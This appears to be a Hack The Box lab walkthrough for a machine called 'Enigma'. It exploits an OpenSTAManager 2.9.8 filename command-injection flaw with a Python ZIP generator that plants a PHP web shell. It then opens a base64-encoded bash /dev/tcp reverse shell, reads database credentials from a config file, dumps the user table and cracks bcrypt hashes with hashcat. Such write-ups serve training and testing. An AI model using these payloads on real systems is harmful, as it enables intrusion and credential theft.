OpenSTAManager is an open-source business management and technical assistance platform — commonly used by IT support teams to manage invoices, contracts, and customer tickets.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.8 OpenSTAManager Admin Access Confirmed

Go ahead and log in using the admin credentials recovered from Sarah's mailbox (`admin` / `Ne3s4rtars78s`).

Logging in with the credentials recovered from Sarah's mailbox (`admin` / `Ne3s4rtars78s`) grants immediate access to the OpenSTAManager dashboard. The interface presents a full business management panel with modules for Entities, Email Settings, Documents Management, Tasks, Sales, Purchases, Accounting, Storage, Plants, Stats, Maps, and Tools visible in the left sidebar.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.9 Version Fingerprinting

Once inside, the first thing to do is locate the application's version number — this will be needed to identify whether any known vulnerabilities apply. Look closely at the **bottom right corner** of the dashboard — the version number is already visible: ==**Version 2.9.8 (d1t5d9b)**==.

![[Pasted image 20260701034026.png]]

This is an important finding. Knowing the exact version allows us to search for known vulnerabilities specific to this release. Take note of it and then click the **"i" (Information) icon** in the top-right toolbar to confirm the version details on the dedicated information page.

![[Pasted image 20260701034227.png]]
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 3.1 Vulnerability Research & Exploit Identification

With an exact version confirmed, the next step is to research whether any known vulnerabilities exist for this release.

Searching for **"OpenSTAManager Version 2.9.8 CVE"** returns a number of results across NVD, CVE Details, Sploitus, and Vulners. The search results reveal that version 2.9.8 is affected by multiple vulnerabilities

![[Pasted image 20260701040923.png]]
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### CVE-2025-69212

| Field                   | Detail                                               |
| ----------------------- | ---------------------------------------------------- |
| CVE ID                  | CVE-2025-69212                                       |
| Type                    | OS Command Injection                                 |
| Affected Versions       | 2.9.8 and earlier                                    |
| Location                | P7M (signed XML) file decoding functionality         |
| Authentication Required | Yes — admin access needed                            |
| Impact                  | Arbitrary OS command execution on the hosting server |

**How the flaw works:** The application allows uploading a ZIP file containing a `.p7m` invoice file for processing. When the ZIP is extracted, the filename of the `.p7m` file is passed directly to a system command without sanitisation. By crafting a malicious filename containing shell metacharacters, the intended command can be broken out of and arbitrary commands injected in its place.

**Remediation (for reference):** The vendor advisory recommends upgrading to version 2.9.9 or later where the filename is properly sanitised before being passed to the system command.

Since we have admin credentials and the target is running version 2.9.8, all conditions for exploitation are met. The next step is to craft the malicious ZIP payload. Move to your terminal and we'll build it now.

![[CVE-2025-69212.png]]


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Web Exploitation (Foothold)

### 3.1 Crafting the Malicious Payload

Create the exploit generator script:

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ vi genex.py  

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ cat genex.py
```

```python
import zipfile

cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```

**Breakdown:**

**`import zipfile`**  
Imports Python's built-in ZIP file library. This is what allows us to create and write ZIP archives directly from Python without needing any external tools.

**`cmd = 'cd files && echo \'<?php system($_GET["c"]); ?>\' > SHELL.php'`**  
This is the actual command we want the server to execute. Breaking it down further:

- `cd files` — moves into OpenSTAManager's publicly accessible `files/` directory, which is reachable via the web server
- `&&` — only runs the next command if the first one succeeded
- `echo '<?php system($_GET["c"]); ?>' > SHELL.php` — writes a minimal one-line PHP web shell into that directory. The shell accepts a command via the `c` GET parameter and executes it on the server using PHP's `system()` function

**`malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'`**  
This is the heart of the exploit — the injected filename. When OpenSTAManager receives this filename and passes it unsanitised to a system command, the following happens:

- `invoice.p7m"` — closes the expected filename string with a `"`
- `;` — ends the original command
- `{cmd}` — injects our shell command
- `;echo "` — chains another command to cleanly re-open the string
- `.p7m` — closes the string back to something that looks like a normal `.p7m` extension, preventing an immediate crash

**`with zipfile.ZipFile('exploit.zip', 'w') as zf:`**  
Creates a new ZIP file called `exploit.zip` in write mode. The `with` block ensures the file is properly closed and finalised once writing is complete.

**`zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")`**  
Writes an entry into the ZIP archive using our malicious string as the filename. The actual file content (`DUMMY_P7M_CONTENT`) is irrelevant — it's just a placeholder to make the ZIP valid. The application will error when trying to parse it as XML, but the command injection in the filename fires before that error occurs.

**`print("[+] exploit.zip created")`**  
Confirms the script ran successfully and the ZIP file is ready to upload.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

Run `genex.py`.

**Command:** `python3 genex.py`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ python3 genex.py       
[+] exploit.zip created

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ ls
exploit.zip  genex.py
```

`exploit.zip` is now ready to be delivered to the target. The next step is to authenticate to OpenSTAManager and upload the ZIP through the Importazione FE module. This can be done either through the browser UI or scripted via `curl`.

**Browser Method:**

In your OpenSTAManager dashboard, navigate to:

**Sales → Invoices → Importazione FE**

You should see a file upload form with a **"Carica documenti"** (Upload Documents) button.

1. Click **"Choose File"**
2. Navigate to and select your `exploit.zip` file
3. Click **"Carica documenti"** to upload

![[Pasted image 20260701102411.png]]

![[Pasted image 20260701102421.png]]

**Result:**

The application responds with an error dialog: **"Start tag expected, '<' not found"**. This is the same XML parsing error encountered previously and is entirely expected — it means the application successfully extracted the ZIP, attempted to parse the dummy file content as XML, and failed because `DUMMY_P7M_CONTENT` is not valid XML.

This error is a red herring. What matters is not whether the XML parsed correctly, but whether the injected filename command fired during the extraction step — which happens before the XML parsing even begins. The error actually confirms the file was processed far enough for the injection to have triggered.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Web Shell Confirmed

**Command:** `curl "http://support_001.enigma.htb/files/SHELL.php?c=id"`

**Breakdown:**

- `http://support_001.enigma.htb/files/SHELL.php`
    - **Description:** The path to the PHP web shell written by the injected filename command during the upload's processing step.
    - **Purpose:** Confirms the file was created on disk and is being served by the web server, despite the XML parsing error shown in the UI.
- `?c=id`
    - **Description:** Query parameter consumed by `system($_GET["c"])` inside the web shell.
    - **Purpose:** Executes the `id` command — a safe, non-destructive test that simply returns the current user context, confirming code execution without causing any damage or triggering anything irreversible.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The web shell is alive and executing commands on the server as `www-data` — the user that the nginx/PHP web service runs as. This confirms that **CVE-2025-69212 was successfully exploited** and we have arbitrary command execution on the target.

To summarise what just happened:

![[Web Shell Execution Flow.png]]
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.3 Establishing a Reverse Shell

With code execution confirmed, the next step is to upgrade from a one-shot web shell to a fully interactive reverse shell. This requires two terminals running simultaneously — one to listen for the incoming connection, and one to trigger the payload.

**Terminal 1 — Start the Listener**

**Command:** `nc -lvnp 80`

**Breakdown:**

- `-l`
    - **Description:** Listen mode — instructs netcat to wait for an incoming connection rather than initiating one.
    - **Purpose:** Sets up the receiver on our end that will catch the shell when the target connects back.
- `-v`
    - **Description:** Verbose output.
    - **Purpose:** Prints connection status messages so we can see when the target connects.
- `-n`
    - **Description:** Numeric-only mode — disables DNS resolution.
    - **Purpose:** Prevents netcat from attempting to resolve hostnames, keeping the connection faster and cleaner.
- `-p 80`
    - **Description:** Specifies the port to listen on.
    - **Purpose:** Port 80 is used here specifically because egress testing earlier confirmed the target is permitted to make outbound connections on port 80. Higher ports like 4444 were silently blocked by the target's firewall.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ nc -lvnp 80  
listening on [any] 80 ...
```

The listener is up and waiting. Leave this terminal open and move to Terminal 2.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

**Terminal 2 — Generate the Payload**

**Command:** `echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0`

**Breakdown:**

- `bash -i >& /dev/tcp/10.10.15.227/80 0>&1`
    - **Description:** A Bash reverse shell one-liner using `/dev/tcp` — a built-in Bash feature that opens a raw TCP connection to a specified host and port.
    - **Purpose:** When executed on the target, this opens a connection back to our listener on port 80 and redirects the shell's input and output through that connection, giving us an interactive terminal on the remote machine.
- `| base64 -w0`
    - **Description:** Pipes the shell command through base64 encoding with no line wrapping (`-w0`).
    - **Purpose:** The raw reverse shell contains special characters (`>&`, `&`) that would be misinterpreted or mangled when passed through a URL query parameter. Base64 encoding converts it to a safe alphanumeric string that survives the HTTP request intact.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ echo 'bash -i >& /dev/tcp/10.10.15.227/80 0>&1' | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=
```

This is the base64-encoded reverse shell payload.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

Why Do we encode the payload?

It comes down to two problems that special characters cause:

**Problem 1: URL interpretation**

When you put a command like `bash -i >& /dev/tcp/10.10.15.227/80 0>&1` into a URL, certain characters have special meanings in HTTP:

|Character|What HTTP thinks it means|
|---|---|
|`&`|Separates multiple query parameters|
|`>`|Not valid in a URL at all|
|`/`|Path separator|
|`=`|Separates a parameter name from its value|

So a URL like `?c=bash -i >& /dev/tcp/...` would arrive at the server completely broken — the `&` would be interpreted as the start of a second parameter, splitting your command in half before it ever reaches PHP.

**Problem 2: Shell interpretation**

Even if the URL survived intact, the shell on the server side might misinterpret the redirections (`>&`, `0>&1`) depending on how PHP's `system()` spawns the subprocess.

**Base64 sidesteps both problems entirely** because the base64 character set only uses letters, numbers, `+`, `/`, and `=` — and `--data-urlencode` handles those safely. The encoded string travels as a clean, unambiguous blob, and the decoding (`base64 -d | bash`) happens entirely on the server side after it arrives, where the special characters are no longer inside a URL.

Think of it like putting a letter in an envelope — the envelope (base64) travels safely through the postal system (HTTP), and only gets opened (decoded) once it reaches its destination (the server).
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.4 ## Reverse Shell Established

**Command:** `curl --get --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash" "http://support_001.enigma.htb/files/SHELL.php"`

**Breakdown:**

- `--get`
    - **Description:** Forces curl to send the request as HTTP GET, appending the data as a query string rather than a POST body.
    - **Purpose:** Critical — the web shell reads `$_GET["c"]` exclusively, so sending as POST would silently deliver the payload to a parameter the script never reads, resulting in no execution.
- `--data-urlencode "c=echo YmFzaC...|base64 -d|bash"`
    - **Description:** URL-encodes the full command string and appends it to the query string as the `c` parameter.
    - **Purpose:** Safely encodes the pipe characters and spaces in the command so they survive the HTTP request intact and arrive at the server exactly as intended.

**Result — Terminal 1 (curl):**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ curl --get --data-urlencode "c=echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4yMjcvODAgMD4mMQo=|base64 -d|bash" \
"http://support_001.enigma.htb/files/SHELL.php"
<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx/1.24.0 (Ubuntu)</center>
</body>
</html>
```

**Result — Terminal 2 (listener):**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ nc -lvnp 80  
listening on [any] 80 ...
connect to [10.10.15.227] from (UNKNOWN) [10.129.33.26] 59068
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
www-data@enigma:~/html/openstamanager/files$ 
```

We have an **interactive shell on the target machine as www-data**. The foothold is complete.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Lateral Movement to `haris`

### 4.1 Database Credential Extraction

Read the application's configuration file directly from the web directory to recover the database credentials stored inside it.

**Command:** `cat /var/www/html/openstamanager/config.inc.php`

**Breakdown:**

- `cat`
    - **Description:** Prints the contents of a file to the terminal.
    - **Purpose:** Reads the OpenSTAManager configuration file directly from disk — no special privileges required since `www-data` owns the web directory and can read its own application files.
- `/var/www/html/openstamanager/config.inc.php`
    - **Description:** The primary configuration file for the OpenSTAManager installation.
    - **Purpose:** Web applications store their database connection details here in plaintext — host, username, password, and database name — so the application can connect to MySQL on startup.

**Result:**

```shell
www-data@enigma:~/html/openstamanager/files$ cat /var/www/html/openstamanager/config.inc.php
<es$ cat /var/www/html/openstamanager/config.inc.php
<?php

/*
 * OpenSTAManager: il software gestionale open source per l'assistenza tecnica e la fatturazione
 * Copyright (C) DevCode s.r.l.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
];

// Tema selezionato per il front-end
$theme = 'default';

// Impostazioni di sicurezza
$redirectHTTPS = false; // Redirect automatico delle richieste da HTTP a HTTPS
$disableCSRF = true; // Protezione contro CSRF

// Impostazioni di debug
$debug = false;

$disable_hooks = false;

// Permette di accedere solo con un ip (da utilizzare per manutenzione)
$maintenance_ip = '';

// Personalizzazione dei gestori dei tag personalizzati
$HTMLWrapper = null;
$HTMLHandlers = [];
$HTMLManagers = [];

// Lingua del progetto (per la traduzione e la conversione numerica)
$lang = 'en_GB';
// Personalizzazione della formattazione di timestamp, date e orari
$formatter = [
    'timestamp' => 'd/m/Y H:i',
    'date' => 'd/m/Y',
    'time' => 'H:i',
    'number' => [
        'decimals' => ',',
        'thousands' => '',
    ],
];

// Ulteriori file CSS e JS da includere
$assets = [
    'css' => [],
    'print' => [],
    'js' => [],
];

// Configura il limite di tempo di esecuzione del file cron.php
$php_time_limit = '';
www-data@enigma:~/html/openstamanager/files$ 
```

The configuration file reveals the MySQL database credentials in plaintext:

```
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

Two additional settings in the file are worth noting from a security perspective — `$disableCSRF = true` and `$redirectHTTPS = false`. These confirm the application is running with multiple security controls deliberately disabled, which contributed to making the earlier exploitation chain possible.

With valid database credentials in hand, the next step is to connect to MySQL and dump the application's user table. Web applications commonly store OS-level account credentials alongside application user records — and those hashes, if cracked, can be reused to log in as a real system user.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Dumping the User Table

#### Step 1 — List all databases

```shell
www-data@enigma:~/html/openstamanager/files$ mysql -u brollin -p'Fri3nds@9099' -e "show databases;" 2>/dev/null
<n -p'Fri3nds@9099' -e "show databases;" 2>/dev/null
Database
information_schema
openstamanager
performance_schema
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### Step 2 — List all tables inside the target database:

```shell
www-data@enigma:~/html/openstamanager/files$ mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; show tables;" 2>/dev/null
<' -e "use openstamanager; show tables;" 2>/dev/null
Tables_in_openstamanager
an_anagrafiche
an_anagrafiche_agenti
an_assicurazione_crediti
an_mansioni
an_nazioni
an_nazioni_lang
an_pagamenti_anagrafiche
an_provenienze
an_provenienze_lang
an_referenti
an_regioni
an_regioni_lang
an_relazioni
an_relazioni_lang
an_sdi
an_sedi
an_sedi_tecnici
an_settori
an_settori_lang
an_tipianagrafiche
an_tipianagrafiche_anagrafiche
an_tipianagrafiche_lang
an_zone
co_banche
co_categorie_contratti
co_categorie_contratti_lang
co_contratti
co_contratti_tipiintervento
co_dichiarazioni_intento
co_documenti
co_fatturazione_contratti
co_iva
co_iva_lang
co_mandati_sepa
co_movimenti
co_movimenti_modelli
co_pagamenti
co_pagamenti_lang
co_pianodeiconti1
co_pianodeiconti2
co_pianodeiconti3
co_preventivi
co_promemoria
co_provvigioni
co_riferimenti_righe
co_righe_ammortamenti
co_righe_contratti
co_righe_documenti
co_righe_preventivi
co_righe_promemoria
co_ritenuta_contributi
co_ritenutaacconto
co_rivalse
co_scadenziario
co_stampecontabili
co_staticontratti
co_staticontratti_lang
co_statidocumento
co_statidocumento_lang
co_statipreventivi
co_statipreventivi_lang
co_tipi_scadenze
co_tipi_scadenze_lang
co_tipidocumento
co_tipidocumento_lang
do_categorie
do_categorie_lang
do_documenti
do_permessi
dt_aspettobeni
dt_aspettobeni_lang
dt_causalet
dt_causalet_lang
dt_ddt
dt_porto
dt_porto_lang
dt_righe_ddt
dt_spedizione
dt_spedizione_lang
dt_statiddt
dt_statiddt_lang
dt_tipiddt
dt_tipiddt_lang
em_accounts
em_email_attachment
em_email_print
em_email_receiver
em_email_upload
em_emails
em_files_categories_template
em_list_receiver
em_lists
em_lists_lang
em_mansioni_template
em_newsletter_receiver
em_newsletters
em_print_template
em_templates
em_templates_lang
fe_causali_pagamento_ritenuta
fe_modalita_pagamento
fe_modalita_pagamento_lang
fe_natura
fe_natura_lang
fe_regime_fiscale
fe_regime_fiscale_lang
fe_stati_documento
fe_stati_documento_lang
fe_tipi_documento
fe_tipi_documento_lang
fe_tipi_ritenuta
fe_tipo_cassa
in_fasceorarie
in_fasceorarie_lang
in_fasceorarie_tipiintervento
in_interventi
in_interventi_tags
in_interventi_tecnici
in_interventi_tecnici_assegnati
in_righe_interventi
in_righe_tipiinterventi
in_statiintervento
in_statiintervento_lang
in_tags
in_tariffe
in_tipiintervento
in_tipiintervento_lang
mg_articoli
mg_articoli_barcode
mg_articoli_lang
mg_articolo_attributo
mg_attributi
mg_attributi_lang
mg_attributo_combinazione
mg_causali_movimenti
mg_causali_movimenti_lang
mg_combinazioni
mg_combinazioni_lang
mg_fornitore_articolo
mg_listini
mg_listini_articoli
mg_movimenti
mg_piani_sconto
mg_prezzi_articoli
mg_prodotti
mg_scorte_sedi
mg_unitamisura
mg_valori_attributi
my_componenti
my_componenti_interventi
my_impianti
my_impianti_contratti
my_impianti_interventi
my_impianto_componenti
or_ordini
or_righe_ordini
or_statiordine
or_statiordine_lang
or_tipiordine
or_tipiordine_lang
updates
zz_api_log
zz_api_resources
zz_cache
zz_cache_lang
zz_categorie
zz_categorie_lang
zz_check_user
zz_checklist_items
zz_checklists
zz_checks
zz_currencies
zz_currencies_lang
zz_default_description
zz_default_description_module
zz_events
zz_field_record
zz_fields
zz_files
zz_files_categories
zz_files_print
zz_group_module
zz_group_module_lang
zz_group_segment
zz_group_view
zz_groups
zz_groups_lang
zz_hooks
zz_hooks_lang
zz_imports
zz_imports_lang
zz_langs
zz_logs
zz_marche
zz_modules
zz_modules_lang
zz_notes
zz_oauth2
zz_operations
zz_otp_tokens
zz_permissions
zz_plugins
zz_plugins_lang
zz_prints
zz_prints_lang
zz_segments
zz_segments_lang
zz_semaphores
zz_settings
zz_settings_lang
zz_storage_adapters
zz_tasks
zz_tasks_lang
zz_tasks_logs
zz_tokens
zz_user_sedi
zz_users
zz_views
zz_views_lang
zz_widgets
zz_widgets_lang
```

From the full table list, you'd scan for anything that looks user or credential related — names like `users`, `accounts`, `admin`, `members`, `auth` etc. In OpenSTAManager's case that turns out to be `zz_users`.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### Step 3 — Dump the target table:

**Command:** `mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null`

**Breakdown:**

- `-u brollin`
    - **Description:** Specifies the MySQL username.
    - **Purpose:** Authenticates using the credential recovered from the configuration file.
- `-p'Fri3nds@9099'`
    - **Description:** Supplies the password inline without a space between `-p` and the value.
    - **Purpose:** Allows the command to run non-interactively inside the reverse shell without waiting for a password prompt — essential since we don't have a proper TTY.
- `-e "use openstamanager; select * from zz_users;"`
    - **Description:** Executes the given SQL statements and exits immediately.
    - **Purpose:** Selects the correct database and dumps the entire user table in a single non-interactive command, avoiding the need to enter the MySQL shell manually.
- `2>/dev/null`
    - **Description:** Redirects stderr to the null device, discarding all error output.
    - **Purpose:** Suppresses MySQL's inline-password security warning (`Warning: Using a password on the command line interface can be insecure`) which would otherwise clutter the output.

**Result:**

```shell
www-data@enigma:~/html/openstamanager/files$ mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null
<penstamanager; select * from zz_users;" 2>/dev/null
id      username        password        email   idanagrafica    idgruppo        enabled created_at      updated_at      reset_token        image_file_id   options
1       admin   $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu    admin@enigma.htb        1       1       1 2026-02-18 19:26:52      2026-02-18 19:26:52     NULL    NULL
2       haris   $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC    haris@enigma.htb        1       5       1 2026-02-18 20:58:28      2026-05-26 11:07:03     NULL    NULL
www-data@enigma:~/html/openstamanager/files$ 
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 Cracking the Hashes

**Command:** `echo 'admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu' > hashes.txt ; echo 'haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' >> hashes.txt`

**Breakdown:**

- `> hashes.txt`
    - **Description:** Creates/overwrites `hashes.txt` with the first hash entry.
    - **Purpose:** Starts a clean file with the admin hash in `username:hash` format.
- `>>`
    - **Description:** Appends to an existing file without overwriting it.
    - **Purpose:** Adds the haris hash on a new line below the admin entry, giving hashcat a clean two-entry file to work against.
- `;`
    - **Description:** Runs both commands sequentially on one line regardless of whether the first succeeds.
    - **Purpose:** Keeps both file-writing operations in a single terminal entry without the line-joining issue caused by the backslash `\` continuation used in the previous attempt.

**Command:** `cat hashes.txt`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ cat hashes.txt
admin:$2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu
haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
```

The file is clean — two entries, one per line, each correctly prefixed with its username. Now run hashcat:

**Command:** `hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username`

**Breakdown:**

- `-m 3200`
    - **Description:** Selects hash mode 3200, corresponding to bcrypt (`$2*$` / Blowfish).
    - **Purpose:** Matches the exact hash format recovered from the `zz_users` table — identifiable by the `$2y$10$` prefix.
- `-a 0`
    - **Description:** Straight/dictionary attack mode.
    - **Purpose:** Tests every password in the wordlist against both hashes sequentially — the simplest and fastest approach before trying rules or masks.
- `hashes.txt`
    - **Description:** The file containing both hashes in `username:hash` format.
    - **Purpose:** Feeds both hashes to hashcat simultaneously so both are attempted in the same session rather than running two separate jobs.
- `/usr/share/wordlists/rockyou.txt`
    - **Description:** The RockYou leaked password wordlist containing 14 million real-world passwords.
    - **Purpose:** The most commonly used starting wordlist for credential attacks — covers the vast majority of weak and commonly chosen passwords.
- `--username`
    - **Description:** Tells hashcat to expect and ignore the `username:` prefix in the hash file.
    - **Purpose:** Without this flag hashcat would try to parse the username as part of the hash and throw a token length exception — as seen in the previous failed attempt.

**Result:** 

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --username
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-13th Gen Intel(R) Core(TM) i5-13420H, 1433/2867 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Temperature abort trigger set to 90c

INFO: Removed hash found as potfile entry.

Host memory allocated for this attack: 512 MB (1513 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: hashes.txt
Time.Started.....: Wed Jul  1 08:49:19 2026 (10 mins, 26 secs)
Time.Estimated...: Mon Jul  6 05:03:57 2026 (4 days, 20 hours)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       34 H/s (9.68ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/2 (50.00%) Digests (total), 0/2 (0.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 42864/28688770 (0.15%)
Rejected.........: 0/42864 (0.00%)
Restore.Point....: 21424/14344385 (0.15%)
Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:224-256
Candidate.Engine.: Device Generator
Candidates.#01...: deandre1 -> christopher1
Hardware.Mon.#01.: Util: 71%

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q

Session..........: hashcat
Status...........: Quit
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: hashes.txt
Time.Started.....: Wed Jul  1 08:49:19 2026 (17 mins, 5 secs)
Time.Estimated...: Sun Jul  5 21:51:26 2026 (4 days, 12 hours)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:       37 H/s (9.66ms) @ Accel:4 Loops:32 Thr:1 Vec:1
Recovered........: 1/2 (50.00%) Digests (total), 0/2 (0.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 74896/28688770 (0.26%)
Rejected.........: 0/74896 (0.00%)
Restore.Point....: 37440/14344385 (0.26%)
Restore.Sub.#01..: Salt:1 Amplifier:0-1 Iteration:0-32
Candidate.Engine.: Device Generator
Candidates.#01...: pink90 -> pascale
Hardware.Mon.#01.: Util: 72%

Started: Wed Jul  1 08:48:56 2026
Stopped: Wed Jul  1 09:06:29 2026
```

The status output shows `Recovered: 1/2 (50.00%)` — one of the two hashes cracked during the session. The line `INFO: Removed hash found as potfile entry` at the start also indicates hashcat already had one hash in its potfile (its cache of previously cracked hashes) from an earlier session, meaning `haris` had already been cracked before this run began. The `admin` hash did not crack within the wordlist — either the password is not in rockyou or it is strong enough to resist a straight dictionary attack.

The cracked result was confirmed with:

**Command:** `hashcat -m 3200 hashes.txt --show --username`

**Breakdown:**

- `--show`
    - **Description:** Displays all previously cracked hashes from the potfile instead of running a new attack.
    - **Purpose:** Quickly retrieves cracked results without re-running the full attack — useful for confirming results after a session completes or is interrupted.
- `--username`
    - **Description:** Includes the username prefix in the output.
    - **Purpose:** Maps the cracked plaintext back to the correct account so there is no ambiguity about which password belongs to which user.

**Result:**

```
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Enigma]
└─$ hashcat -m 3200 hashes.txt --show --username                               
Mixing --show with --username or --dynamic-x can cause exponential delay in output.

haris:$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
```

The `haris` hash cracked successfully to the plaintext password **`bestfriends`**. The `admin` hash produced no result — confirming the admin account uses a stronger password not present in the rockyou wordlist.

